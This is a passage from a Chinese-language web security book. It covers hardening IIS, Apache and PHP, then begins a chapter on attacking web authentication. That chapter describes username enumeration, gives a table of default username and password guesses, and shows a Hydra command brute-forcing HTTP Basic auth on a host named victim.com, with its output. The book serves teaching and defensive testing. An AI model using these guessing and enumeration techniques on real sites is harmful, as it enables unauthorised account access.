word-wrap: break-word;'>.htw</td><td style='text-align: center; word-wrap: break-word;'>“Webhits”源代码泄漏，MS00-006</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>FrontPage 服务器扩展 RAD 支持</td><td style='text-align: center; word-wrap: break-word;'>卸载 FPSE RAD 支持</td><td style='text-align: center; word-wrap: break-word;'>远程 IUSR 或系统缓冲区溢出，MS01-035</td></tr></table>

在 Windows Server 2003 上发布的 IIS 6 中, Microsoft 在默认情况下禁止了所有的扩展。如果你使用微软的产品, IIS 6 的该措施和很多其他的安全改进, 使得 IIS 6 成为我们对 Web

平台极少的推荐选择。一个不错的做法是遵循 Microsoft 对 IIS 6 的处理，和你的开发团队一起确认哪些扩展是需要的，然后禁止其他所有的扩展。

##### 使用 IISLockdown 和 URLScan

在 2001 年末，微软发布了 IISLockdown 向导（查看本章“参考和进一步阅读”一节）。顾名思义，IISLockdown 是一个自动化的、模板驱动的程序，用来对 IIS 应用安全配置。它会配置有关下列项目的各种设置：

- Internet 服务 视服务器的角色而定，禁止四种 IIS 服务（WWW，FTP，SMTP 和 NNTP）。

☐ 脚本映射 视服务器的角色而定，禁止 ISAPI DLL 脚本映射。

- 额外的安全措施 所有的杂项，包括删除所选择的默认虚拟目录，比如 IISSamples，MSADC，IISHelp，Scripts 等。你也可以设置 NTFS ACL 来防止匿名用户通过诸如 cmd.exe 的工具写数据到内容目录。你也可以禁止 WebDAV。

o URLScan 一个模板驱动的过滤器，解析对 IIS 的请求，并拒绝那些符合特定规则的请求——可以认为是 IIS 的防火墙。

虽然我们已经比较全面地讨论了有关 IIS 安全配置的问题，但仍有一些需要特别说明的地方。虽然 IISLockdown 有助于加固平台的自动化工作，但这并不意味它是全面的。IISLockdown 没有提供安装服务包和补丁的方法，没有涉及 Windows 操作系统安全漏洞的其他任何方面，也没有在服务器上提供适当的配置好的防火墙。这就是虽然 IISLockdown 是一个很有用的工具，可以简化很多 IIS 安全方面的工作，但不要由于使用该工具而产生安全错觉使自己麻痹。

因为可以手动实现 IISLockdown 的绝大部分安全功能，所以我们来考虑其中最引人注目的功能——URLScan。事实上，URLScan 可以从 IISLockdown 安装包中单独提取出来，手动进行安装。

提示 IIS 6 默认启用 URLScan。关于 URLScan 配置和使用的完整论述，请参看附录 D。

#### 对 Web 服务器卷总是使用 NTFS 并恰当地设置访问控制列表（ACL）

对于 FAT 和 FAT32 文件系统，无法进行文件和目录级别的访问控制，这就导致 IURS 账户有权读取文件和上传文件。当在 Web 可访问的 NTFS 目录上配置访问控制时，请使用最小权限法则。IIS 5 也提供了 IIS 权限向导，可以帮助你进行 ACL 设置。权限向导可以在 IIS 管理控制台里，通过在对应的虚拟目录上单击鼠标右键来访问。我们强烈建议你使用它。

#### 移动，更名，删除或限制功能强大的工具

微软公司推荐对 cmd.exe 和其他一些功能强大的可执行文件设置 NTFS ACL，只给 Administrator 和 SYSTEM 保留完全控制权限。微软已经公开示范了该简单技巧的确可以阻止绝大多数远程命令的执行，因为此时 IUSR 不再有权限访问 cmd.exe 了。同时，微软也推荐使用内置的 CACLS 工具来全面地设置这些权限。让我们看一个使用 CACLS 来对系统目录中可执行文件设置权限的例子。因为在系统文件夹中有很多的可执行文件，为了使例子简单化，我们把文件移动到一个叫做 test1 的新目录下，在该目录下还有一个叫做 test2 的子目录。使用 CACLS 显示模式可以看到，这些文件的权限实在是太松了：

C:\cacls test1 /T
C:\test1 Everyone: (OI) (CI)F
C:\test1\test1.exe Everyone:F
C:\test1\test1.txt Everyone:F
C:\test1\test2 Everyone: (OI) (CI)F
C:\test1\test2\test2.exe Everyone:F
C:\test1\test2\test2.txt Everyone:F

假设你想改变 test1 及其子目录中所有可执行文件的权限为 System: 完全控制，Administrators: 完全控制。下面是使用 CACLS 的命令语法：

C:\cacls test1\*.exe /T /G System:F Administrators:F
Are you sure (Y/N)?
processed file: C:\test1\test1.exe
processed file: C:\test1\test2\test2.exe

现在我们再次运行 CACLS 确认结果。请注意，所有子目录下的.txt 文件还是原始的权限，但可执行文件已经被正确地设置了：

C:\\cacls test1 /T
C:\\test1 Everyone: (OI) (CI) F
C:\\test1\\test1.exe NT AUTHORITY\\SYSTEM:F
    BUILDTIN\\Administrators:F
C:\\test1\\test1.txt Everyone:F
C:\\test1\\test2 Everyone: (OI) (CI) F
C:\\test1\\test2\\test2.exe NT AUTHORITY\\SYSTEM:F
    BUILDTIN\\Administrators:F
C:\\test1\\test2\\test2.txt Everyone:F

当把这个例子引申到一个典型的 Web 服务器上时，一种很好的做法就是把 %systemroot% 目录下的所有可执行文件都设置为 System:完全控制，Administrators:完全控制，就像下面这样：

C:\cacls %systemroot%\*.exe /T /G System:F Administrators:F

这会阻止所有非管理员用户使用这些可执行文件，并帮助防范诸如 Unicode 之类的攻击，此类攻击很依赖于对这些文件的非特权访问。

当然，这些可执行文件也可以移动、改名或者删除。这会使得黑客更加难以触及。

提示 IISLockdown 工具会对系统工具自动赋予 ACL。

##### 删除服务器上可写和可执行 ACL 中的 Everyone 和 Guests 组

匿名 IIS 访问的账户 IUSR_machinename 和 IWAM_machinename 属于 Everyone 组和 Guests 组，所以需要特别确认，IUSR 和 IWAM 账户对系统上的所有文件和目录都没有写权限——你已经见识到了哪怕只是一个可写的目录会导致什么样的后果。同样的，对非特权组赋予可执行权限要谨慎，特别要确认不能允许任何非特权组用户对同一个目录既有写权限也有可执行权限。

##### 仔细检查调用 RevertToSelf 的 ISAPI 应用程序并删除它们

IIS 的老版本含有针对 RevertToSelf Win32 程序调用的提升权限攻击漏洞。通过实例化使用该调用的 DLL，攻击者可以破坏它以获得最高的 LocalSystem 权限。虽然这主要是 IIS 5 及之前版本所关注的问题，但在版本 6 的兼容模式下仍然存在漏洞。可以通过评估 RevertToSelf 调用的 IIS DLL，来防止该调用被用来提升权限。使用 Win32 开发者工具中的 dumpbin 来帮助你做这件事，就像下面显示的使用 IsapiExt.dll 的例子一样：

dumpbin /imports IsapiExt.dll | find "RevertToSelf"

#### 3.4.3 加固 Apache

Apache 的安全性不错，Apache 开发小组的工作也做得很好，总是很快地修复绝大多数安全问题。但是，当你在实际中使用 Apache，并在上面运行实际的 Web 应用程序时，加固 Apache 就开始显得有些复杂了。

事实上，当知道了 Apache 所有正确和错误的配置方法后，加固 Apache 的工作，甚至是了解加固 Apache 的正确方法，都令人望而生畏。我们编辑了一个列表，列出了为了加固服务器，所有 Apache 服务器都应该具备的首要安全基础。该列表并不够全面和完整，也会根据服务器的用途而改变。幸运的是，有大量的自动化脚本、工具和文档可以帮助你进行恰当的 Apache 安全配置。相关参考请见本章末尾。

#### 禁用不必要的模块

当安装 Apache 时，需要考虑的重要因素之一是就 Web 服务器需要有什么类型的功能。比如，是否会运行 PHP 脚本或者是 Perl 脚本？是否会在 Web 服务器上运行的应用程序中使用服务器端包含（Server Side Include）？一旦创建了所需功能的列表，就可以启用正确的模块。可以通过使用 httpd 获得所有启用的模块列表。

httpd -l
Compiled-in modules:
    http_core.c
    mod_env.c
    mod_log_config.c
    mod_mime.c
    mod_negotiation.c
    mod_status.c
    mod_include.c
    mod_autoindex.c
    mod_dir.c
    mod_cgi.c
    mod_asis.c
    mod_imap.c
    mod_actions.c
    mod_userdir.c
    mod_alias.c
    mod_access.c
    mod_auth.c
    mod_so.c
    mod_setenvif.c
    mod_perl.c

为了禁用模块，就要在编译和传递任何应该禁用的模块前，使用 configure 脚本。

Apache 1.x  
Apache 2.x  

注意 该方法可以用来删除 Apache 中内置的模块，但对动态模块不适用。

表 3-3 中显示了带有安全风险的模块，建议在你的 Apache 配置中删除。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>mod_userdir</td><td style='text-align: center; word-wrap: break-word;'>允许用户名主文件夹以 “/~username/request” 在 Web 服务器上显示</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mod_info</td><td style='text-align: center; word-wrap: break-word;'>允许攻击者查看 Apache 配置</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>mod_status</td><td style='text-align: center; word-wrap: break-word;'>显示关于 Apache 状态的实时信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mod_include</td><td style='text-align: center; word-wrap: break-word;'>允许使用服务端包含（现在已经很少使用，会带来重大的安全风险）</td></tr></table>

执行 ModSecurity

ModSecurity 是一个由 Ivan Ristic 编写的 Apache 模块，相当于一个 Web 应用程序防火墙。它有很强的适应性，被认为是用来加固 Apache 对抗应用程序攻击和 Web 平台攻击的最好项目之一。ModSecurity 的一些特性列举如下：

○ 请求过滤

☐ 反检测绕过技术

○ HTTP 过滤规则

☐ 完全审计记录

○ HTTP 解释

○ Chroot 功能

o 掩盖 Web 服务器标识

提示 对于 ModSecurity 配置和设置的详细信息，请查看附录 D。

##### Chrooting Apache

安全中的一个标准规则是执行深层次防范措施。当攻击者进入一个 Web 服务器时，攻击者首先会做的就是尝试访问 system 中的文件，比如/etc/passwd，或者通过本地攻击提升他们的权限。为了防止该类型的攻击，人们已经创建了一种方法：将 Apache 服务器放置到一个包含的环境中，或者“监禁”（jail），这种方法被称为“chrooting”。通过执行它，Apache 在自己的文件系统内部以限制的权限运行。这样，就算攻击者获得了文件系统的权限，他也仅能在这个监禁的环境中活动，而没有权限访问真正的文件系统。有两种方法来“chrooting”Apache，我们在下面列出。

外部 chrooting 这种类型的 chrooting 以仅含基本的 Shell 的文件系统开始，所有的处理和所需的依赖项都要复制到这个环境中来运行。这是对 Apache 进行真正限制的一种方法，如果还是闯入了一个 Shell，那么攻击者也仍没有去处。建立和配置该类型 chrooting 是相当复杂的，需要作很多的研究，并取决于 Web 应用程序上所需要运行的软件。要找到如何建立该环境的更多细节步骤，请参看本章结尾的“参考和进一步阅读”一节。

内部 chrooting 内部 chrooting 和外部 chrooting 的不同之处在于，内部 chrooting 从 Apache 流程的内部创建。Apache 以正常模式开始和初始化，但接下来创建一个用来运行的

chroot 环境。默认情况下，Apache 不支持这种类型的 chroot 方法，但是，很多人已经创建了第三方插件，来实现这种支持。

◦ ModSecurity 通过它的 SecChrootDir 配置支持一个 chroot 环境, 只需设置该值为你想“监禁” Apache 的目录。

☐ ModChroot 是一个 Apache 模块，和 ModSecurity Chroot 以同样的方式工作，只需设置 ChrootDir 为恰当的目录即可。

- Apache Chroot（2）是 Arjan De Vet 做的补丁，这是 Apache 的一个真正的补丁，使它可以支持内部的 chrooting。

#### 正确地执行 SuExec（Switch User for Exec）

执行诸如 SuExec 的封装器（wrapper），会允许 CGI 脚本除了以默认的 Apache web 用户运行外，还能以其他用户的权限运行。这可能会非常的危险。让我们看看该问题的两个例子。

例子 1 一个攻击者发现了 Web 服务器上 CGI 脚本的一个漏洞，该漏洞允许执行命令行。如果没有配置 SuExec，攻击者利用该脚本，可以创建 httpd 的后门版本，并将现有的 Web 服务器替换成攻击者的后门版本。

例子 2 一个多主机环境允许每个虚拟主机 Web 站点上传和管理各自的脚本，如果没有配置 SuExec，任何漏洞甚至恶意的 Web 站点管理员都可以访问在同一台服务器上其他 Web 站点的内容。这可以造成很大的安全问题，特别是当你对 Web 站点进行了测试，采取了严格的安全代码，并进行了很完备的 Web 安全配置时，那么你被攻击的唯一原因就是其他的虚拟站点有安全问题，攻击者通过这条路径获得了访问权。

现在你应该明白 SuExec 这类工具的重要性了。安装和配置 SuExec 有时是一个很复杂的过程。SuExec 的配置要求非常严格，很多项都必须恰当的设置。我们建议阅读 Apache 文档了解该过程，文档的位置可以在本章末尾“参考和进一步阅读”中找到。

##### 文档根目录限制

确认 Apache 被禁止访问文档根目录之外的任何文件是一个重要的配置。做这种限制非常简单，可以像下面一样改变 httpd.conf 配置：

<Directory/>
order deny,allow
deny from all
</Directory>

<Directory /www/htdocs>
order allow,deny
allow from all

</Directory>

##### 使用 CIS 的 Apache Benchmark

手工尝试加固 Apache 是一件令人望而生畏的工作，幸运的是，有来自因特网安全中心（CIS）的 Apache Benchmark。有一个专门的文档解释如何恰当地加固 Apache，并做出一个工具来检查给出的配置，解释是否符合一定的安全要求。下面是一个简单的流程，演示如何使用上述工具检查 Apache 的配置。

首先，从相应的 Web 站点上下载工具，然后解压到工作目录。运行 benchmark.pl 脚本并把它指向到你的 httpd.conf 文件。

Help and Usage Information #######
Flags:
-c: Specify the apache configuration file.
-s: Specify the web server url. (optional)
-o: Specify and HTML output file name. (optional)

Check Apache configuration file for compliance.
Usage: benchmark.pl -c httpd.conf -s http://foo.com
Usage: benchmark.pl -c httpd.conf -s http://foo.com -o results.html

Show help.
Usage: benchmark.pl -h
##########
# benchmark.pl -c /usr/local/apache/conf/httpd.conf -o result.html

########## CIS Apache Benchmark Scoring Tool 2.08 #######
Version: 2.08
Description: Check Apache configuration file against the CIS Apache Benchmark.
Copyright 2003-2004, CISSecurity. All rights reserved.
##########
CIS Apache Benchmark requires answers to the following questions:
Press enter to continue.
- Location of the Apache server binary [/usr/local/apache/bin/httpd]
- Has the Operating System been hardened according to any and all applicable OS system security benchmark guidance? [yes|no]
- Created three dedicated web groups? [yes|no]
- Downloaded the Apache source and MD5 Checksums from httpd.apache.org? [yes|no]

- Verified the Apache MD5 Checksums? [yes|no]
- Applied the current distribution patches? [yes|no]
- Compiled and installed Apache distribution? [yes|no]
- Is the root@localhost.localdomain address a valid email alias? [yes|no]
- Are fake CGI scripts used? [yes|no]
- Have you implemented any basic authentication access controls? [yes|no]
- Updated the default apachectl start script's code to send alerts to the appropriate personnel? [yes|no]

然后它会询问一系列的问题，针对你的配置运行一个安全检查脚本，并生成一个如图3-6所示的报告，这样你就知道有哪里需要修改。可以参考 benchmark 中的文档，来了解如何解决每个问题。

 </div>

#### 3.4.4 PHP 最佳实践

我们讨论了主流 PHP 脚本平台上的一些漏洞, 在这里给出一些提示以帮助你避免它们:

○ 避免由用户输入任何文件名和路径。

☐ 正确地使用 eval() 函数，不要带有用户输入。

o 设置 register_globals 为关闭。

☐ 验证所有的用户输入。

##### PHP 的常见的安全选项

下面是和安全相关的、可以在 php.ini 文件中设置的配置选项。通过使用这些设置，可以保证你所运行的 PHP 配置处在一个很好的默认安全设置中。

open_basedir 该设置会限制对指定目录下所有文件的访问。所有的文件操作也被限制在所指定的类型中。一个不错的建议是，任何文件操作的执行都限制在一组特定的目录中。这样，古老而经典的“.../.../.../etc/passwd”攻击就再也行不通了。

disable_functions 该设置禁用 PHP 中的一组功能。这是执行深度防御时很值得考虑的一个方法。如果应用程序不需要使用诸如 eval()，passthru()，system()等带有安全风险的函数，那么就把这些函数设置成绝对禁止执行的函数。如果攻击者的确在 PHP 代码中发现了可以利用的安全问题，这种设置也多多少少可以缓冲一下。

expose_php 把该配置设置为关闭，会删除 HTTP 响应服务头里显示的 PHP 头标。如果你关心的是隐藏 PHP 版本或者隐藏其在服务器上的运行，那么设置它是有帮助的。

display_errors 这是一个简单但很重要的配置，可以在出现异常时给用户显示详细的错误信息。在任何产品环境中，该配置都应该设置为关闭。

safe_mode 在 PHP 中打开 safe_mode 会执行非常严格的文件访问权限。它通过检查运行 PHP 脚本的所有者权限和脚本所访问文件的权限来实现。如果权限不匹配，那么 PHP 会抛出一个安全异常。Safe_mode 常被 ISP 使用，这样在虚拟主机环境中，多个用户可以开发他们自己的 PHP 脚本而不会威胁到服务器的完整性。

allow_url_fopen 该配置会禁止在远程文件上执行文件操作。这是个非常好的全局设置，可以删除包含漏洞。举个例子来说，如果将下面例子代码中的$absolute_path变量设置成“http://www.site.com/”，攻击会因为设置了`allow_url_fopen`而失败。

include($absólute_path.'inc/adodb/adodb.inc.php');

### 3.5 小结

在本章中，我们学到了很多 Web 平台漏洞的最佳防范措施，包括及时更新厂商的安全补丁，禁用 Web 服务器上不必要的功能，以及定期扫描以找出绕过预设验证流程的入侵者。记住，如果建立在一个充满了安全漏洞的 Web 平台之上，那么没有任何应用程序会是安全的。

### 3.6 参考和进一步阅读

#### 相关安全通报

微软安全公告

MS04-011, SSL PCT 缓冲区溢出

“Sun-One 应用服务器中的几个漏洞”，其中包括日志绕过问题

Robert Auger 的 “在 IIS 中防范日志绕过”

TRACK 日志绕过

BEA WebLogic 安全通报

http://www.webappsec.org/projects/articles/082905.shtml

Apache 邮件列表——推荐订阅公告来获得安全公告信息

http://secunia.com/advisories/10506/

PHPXMLRPC 远程 PHP 代码注入漏洞

http://www.microsoft.com/technet/

security/bulletin/ms04-011.mspx

http://www.spidynamics.com/spilabs/

advisories/sun-one.html

http://dev2dev.bea.com/pub/advisory/65

PEAR XML_RPC 远程 PHP 代码注入漏洞

http://httpd.apache.org/lists.html

http://www.hardened-php.net/advisory_152005.67.html

phpAdsNew XML-RPC PHP 代码执行漏洞

攻击 PHP 应用中的常见漏洞——以 Scarlet 为例

http://www.hardened-php.net/advisory_

142005.66.html

XML-RPC 针对 PHP 的补丁

PEAR XML-RPC 补丁

http://secunia.com/advisories/15883/

WebInsta 补丁

http://hcs.harvard.edu/~acctserv/help/

studyincarlet.txt

http://pear.php.net/package/XML_RPC/

http://phpxmlrpc.sourceforge.net

http://www.webinsta.com/

downloadm.html

公开的漏洞利用代码

Microsoft PCT 缓冲区溢出 www.k-otik.com

Apache ModSecurity

ModChroot

Arjan De Vet 的 Apache chroot(2)补丁

Apache SuExec 文档

因特网安全中心（CIS）Apache Benchmark

工具和文档

http://www.modsecurity.org

http://core.segfault.pl/~hobbit/mod_chroot/

http://www.devet.org/apache/chroot/

http://httpd.apache.org/docs/

http://www.cisecurity.org/bench_apache.html

http://www.microsoft.com/

http://www.cygwin.com/

#### 通用的参考

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>IIS 安全检查列表</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/security</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>URLScan 信息页面</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/technet/</td></tr><tr><td rowspan="2">“在 IIS 中防止日志绕过”</td><td style='text-align: center; word-wrap: break-word;'>security/tools/urlscan.mspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>http://www.webappsec.org/projects/articles/082905.shtml</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ryan C. Barnett 的 “一步一步加固 Apache”</td><td style='text-align: center; word-wrap: break-word;'>http://www.cgisecurity.com/lib/ryan_barnett_gcux_practical.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Bastille Linux 利用程序</td><td style='text-align: center; word-wrap: break-word;'>http://www.bastille-linux.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ivan Ristic 的 Apache 安全（O&#x27;Reilly）</td><td style='text-align: center; word-wrap: break-word;'>http://www.apachesecurity.net/</td></tr></table>

## 第 4 章 攻击 Web 认证

在 Web 应用程序安全中，认证扮演了一个重要的角色，因为接下来所有的与安全相关决定一般都是在身份认证的基础上进行的。本章阐述了常见 Web 认证机制所受到的威胁，以及能够完全绕过认证控制的威胁。

### 4.1 认证威胁

我们基本上围绕着在此书编写时 Web 上流行的最常见的认证类型来组织本节中的讨论。

☐ 用户名/密码 因为简单，这种认证成为了当今 Web 上最流行的认证形式。

- 更强健的认证 由于认识到用户名/密码认证固有的脆弱性，许多 Web 站点开始为他们的客户提供更强健的认证，包括基于令牌和基于证书的认证。

认证服务 许多 Web 站点把他们的认证外包给了因特网上的服务，比如微软的 Passport，它实现了一个私有的识别管理和认证协议。

#### 4.1.1 用户名/密码威胁

虽然有很多种方法实现基本的用户名/密码认证，但 Web 实现一般都会是下面的某种类型：

o 用户名枚举

○ 密码猜测

o 窃听

在本节中，我们将讨论这些攻击类型，以及对它们来说最薄弱的常见 Web 认证协议。

注意 我们没有为本章中列出的任何攻击指定风险级别，因为这些都是现实中非常常见的攻击类型，其风险级别取决于攻击的具体执行情况。

##### 用户名枚举

用户名枚举主要是为了提高密码猜测攻击的效率，避免浪费时间来对不存在的用户进行密码猜测。比如，如果你确定了这里没有叫做 Alice 的用户，那么就没有必要浪费时间来猜测 Alice 的密码了。下面这些例子是在 Web 应用中经常使用的功能，这些功能可以使你确定出用户名。

剖析结果 在第 2 章中，我们讨论了在 Web 站点中放置用户信息的一些地方，比如源代码注释。聪明的攻击者总是检查他们的剖析数据，因为很多时候它是该类信息的来源（对剖析的信息进行文本搜索，搜寻像 userid，username，user，usr，name，id 和 uid 这样的字符串，常常可以发现真正的用户名）。

我们也会在第 10 章中讨论暴露用户名的常见 Web 站点结构——最明显的泄密者是以用户名命名的目录，服务供应商通常采用这种目录形式组织客户的 Web 内容（比如，http://www.site.com/~joel）。

登录中的错误消息 确定某个用户名是否存在的一个简单方法，是尝试登录，然后查看错误信息。比如，在 Web 应用程序中尝试使用用户名 “Alice”，密码 “abc123” 进行登录。在成功地猜出密码之前，你有可能遇到下面三种错误信息：

☐ 输入的用户名无效

☐ 输入的密码无效

☐ 输入的用户名/密码无效

如果你收到的是第一种错误消息，那么用户名的确在应用程序上不存在，你就不用再浪费时间猜测 Alice 的密码了。但是，如果你收到的是第二种错误消息，那么你就确认了系统上的一个合法用户，可以继续尝试猜测密码了。最后，如果你收到的是第三种错误消息，那么确定 Alice 是否是合法的用户名就比较困难（应用程序设计者从这里或许能明白点什么）。

该类型的攻击一个很好例子是来自 Computer Associates (CA) 的 SiteMinder Web 认证产品所实现的登录功能，Computer Associates 在 2004 年 11 月对 Netegrity 进行收购，并获得了该项技术。对 SiteMinder，你可以通过检查错误页面进行用户名枚举。如果输入一个错误的用户名，站点将加载 nousre.html；如果输入一个合法的用户名但密码不正确，站点则会加载 failedlogin.html。

注册 很多 Web 应用程序允许用户在注册过程中选择自己的用户名。由此我们可以得到确定用户名的另一种方法。在注册过程中，如果你选择了已经存在的用户名，很可能会被提示错误消息：“请选择其他的用户名”。只要你选择的用户名符合应用程序规则，那么你很可能就已经发现另一个用户名了。当选择用户名时，人们常常选择基于自己名字的用户名。比如，Joel Scambray 可能会选择诸如 Joel, JoelS, Jscambray 作为用户名。使用一个

流行的昵称的列表或者一个电话号码本，你可以生成常用的用户名列表。

更改密码中的错误信息 许多 Web 应用程序也拥有密码更改功能，允许用户选择他们自己的密码。通常，该功能有一个单独的页面。有些时候，用户可以输入用户名，但更多的时候，用户名是通过 POST 方法保存在隐藏标记中。进行这样的密码猜测攻击通常需要一个代理，不过通过检查因更改密码而获得的错误信息，你或许可以确定用户名。

账户锁定 为了减轻密码猜测攻击的威胁，许多应用程序会在登录失败一定次数后锁定账户。根据应用的不同安全级别，常见的账户锁定限制为 3 次、5 次和 10 次。同样，应用程序一般会在一段时间，比如 30 分钟，1 小时，24 小时后自动解锁账户，这样做是为了减少对服务中心重置账户的请求。账户锁定会明显地减缓密码猜测攻击的进程，如果配合了很好的密码策略，会在安全性和可用性间达到很好的平衡。

但是，账户锁定只能针对合法的用户名，你如何锁定一个并不存在的用户名呢？很多应用程序对这类细节问题的处理并不正确，举个例子，如果账户的锁定次数设置为 3，那一个不存在的账户会被锁定吗？如果不会，那这就是你可以用来确定不存在账户的一种方法。如果你多次的猜测锁定了一个账户，那么你下次登录的时候，就会收到一个错误信息。但是，很多应用程序是不会为不存在的账户报错的。最后一点，防止通过账户锁定枚举用户名的最好方法，就是根本不告诉用户他已经被锁定了。但是，这肯定会导致用户摸不着头脑并且非常气恼。

有时，账户锁定通过客户端功能诸如 JavaScript 或隐藏标记来实现，比如，有一个变量或者字段代表登录尝试次数。那么绕过客户端账户锁定就非常简单，只要写一个脚本，不改变在 POST 登录过程中尝试的次数即可。

时间攻击 如果其他的方法都失败了，那么时间攻击可能是实施用户名枚举的最后希望了。如果你不能通过错误信息、注册、更改密码来枚举用户名，那可以尝试比较应用程序为错误的密码和错误的用户名生成一个错误消息所需时间的差异。由于匹配算法的不同实现和所用技术的不同，这两种响应时间可能会有显著的差别。但是，该差别需要足够的大，能够超过由于网络延迟和负载而导致的时间波动，该方法才有效果。请记住，该方法存在很高的误警风险。在另一方面，这只是为了猜测用户名，因此即使有高达 25% 的误警率，仍可以有效地增加猜出合法用户名的几率。

在我们进入到下一节（该小节讲述知道用户名后，怎样猜测密码）前，应该注意到允许攻击者确定用户名是很多在线商业站点已经接受的风险。许多安全专家都知道该风险，不是他们不能修补该漏洞，而是商业站点选择了接受该风险。

##### 密码猜测

不必惊讶，密码猜测是用户名/密码认证机制的最大敌人。遗憾的是，该认证机制如今

在 Web 中是如此的常见，已成为密码猜测这种最基础攻击技术的目标。

无论实际的认证协议是什么，总是可以找到猜测密码的方法。我们可以手动猜测密码。当然，也存在自动化客户端软件，可以针对最常用的协议进行密码猜测。接下来，我们会讨论一些常见的密码猜测工具和技术。

手动密码猜测 密码猜测攻击可以手动进行，也可以通过自动化的进行。密码手动猜测是冗长乏味的，我们发现人类的直觉几乎无法与自动化工具相匹敌，特别是用自定制的错误页面来响应基于表单的失败的登录尝试时。当执行密码猜测时，我们偏爱的密码选择如表 4-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>猜测的用户名</td><td style='text-align: center; word-wrap: break-word;'>猜测的密码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[NULL]</td><td style='text-align: center; word-wrap: break-word;'>[NULL]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root, administrator, admin</td><td style='text-align: center; word-wrap: break-word;'>[NULL], root, administrator, admin, password, [company_name]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>operator, webmaster, backup</td><td style='text-align: center; word-wrap: break-word;'>[NULL], operator, webmaster, backup</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>guest, demo, test, trial</td><td style='text-align: center; word-wrap: break-word;'>[NULL], guest, demo, test, trial</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>member, private</td><td style='text-align: center; word-wrap: break-word;'>[NULL], member, private</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[company_name]</td><td style='text-align: center; word-wrap: break-word;'>[NULL], [company_name], password</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[known_username]</td><td style='text-align: center; word-wrap: break-word;'>[NULL], [known_username]</td></tr></table>

如你所见，这是一个非常有限的列表。通过一个自动化工具，整个用户名/密码猜测字典可以一下子输入到一个应用程序中，这可比人工敲入它们快多了。

自动化密码猜测 自动化密码猜测有两种基本方式：深度优先和广度优先。深度优先算法在进入到下一个用户名前，对当前用户名尝试所有的密码，这很可能会导致账户被很快锁定。广度优先算法是对不同的用户名尝试同一个密码，这种方法导致账户锁定的可能性要小些。让我们看看当今常用的一些自动化 Web 密码猜测工具。

注意 自动化密码猜测会对应用程序执行拒绝服务攻击，密码猜测总会增加服务器的负载，并有账户锁定的风险。作为一个攻击者，账户锁定可能是故意为之；但作为测试者，则需要确定是否有账户锁定的危险。

提示 如果有强制执行的密码策略，那么可以有效地缩减寻找密码的空间。比如，如果知道密码策略只允许字符和数字，并要求大小写字符都有，那么就没必要尝试字典中不包括数字的词了。从另一方面来说，如果你在查看一个银行应用程序，它使用 4 位 ATM PIN 作为密码，那么你可以知道大约进行 5000 次试验，就很有可能猜测出 PIN/密码了。

当今在因特网上最常使用的认证协议是 HTTP 基础认证(HTTP Basic)。它最初在 HTTP

规范中定义但还存在一些问题，不过现在已经完善了。基础认证平等地对待所有安全问题，并将这些问题很好的归档（最主要的问题是它发送的用户名/密码很容易被解码，而且每个请求在发送这些证书时都太过于草率了）。

当我们在咨询工作中遇到由基础认证保护的页面时，我们一般都会运行 Hydra 来测试一下账户证书的安全强度。Hydra 是一个简单的工具，它将用户名和密码（或二者的组合）列表作为字典来进行基础认证密码猜测。它通过 “HTTP 302 Object Moved” 响应来表示一个成功的猜测，并且它会在一个给定的用户名/密码文件中，找出所有的成功猜测（也就是说，它不会在发现了第一个合法账户后就停止猜测）。下面的例子显示在 Windows 上通过 Cygwin 使用 Hydra，成功猜测出一个 HTTP 基础认证密码的过程。我们使用 Hydra 的 -C 选项来指定一个单独的用户名/密码文件作为输入，并且攻击了 /secure 目录（这个目录必须在 http-get 参数后指出）：

D:\\Toolbox&gt;hydra -C list.txt victim.com http-get /secure
Hydra v5.0 (c) 2005 by van Hauser / THC - use allowed only for legal purposes.
Hydra (http://www.thc.org) starting at 2005-11-08 21:21:56
[DATA] 6 tasks, 1 servers, 6 login tries, ~1 tries per task
[DATA] attacking service http-get on port 80
[STATUS] attack finished for victim.com (waiting for childs to finish)
[80][www] host: 192.168.224.40 login: user password: guessme
Hydra (http://www.thc.org) finished at 2005-11-08 21:22:01

对于 Web 应用程序攻击，Hydra 支持 http-head，http-get，https-head，https-get 和 http-proxy。

WebCracker 是一个古老的、基于 Windows 的 GUI 应用程序，它与 Hydra 类似。但是在我们的测试中，它是不可定制的。这对于新手和脚本小子，或者只是想做快速检测时，WebCracker 是个很好的工具。图 4-1 显示了 WebCracker 在一个目标 URL 上成功地猜测出一些账户。

Brutus 是一个常用的密码猜测工具，带有攻击 HTTP 基础认证和基于表单认证的内置流程，也带有攻击其他一些协议诸如 SMTP 和 POP3 的内置流程。Brutus 能够执行字典攻击（基于预先编好的词汇表，比如字典），也能够执行暴力攻击，暴力攻击中的密码从给定字符组中随机生成（比如，小写字母表）。图 4-2 显示了在执行一次基础认证密码猜测攻击之后的 Brutus 主界面。

 </div>

 </div>

Brutus 也可以执行基于表单的认证攻击(我们会在接下来的一节中讨论)。关于 Brutus，有一件令人头痛的事情，就是它在执行基于表单的认证攻击时，不显示已猜测出的密码。而且我们有时还发现它会发布虚警的结果，即声明它已经猜测出了一个账户密码，而实际

上并没有。但不管怎么样，总的来说，在密码猜测方面，Brutus 的灵活性还是无可匹敌的。

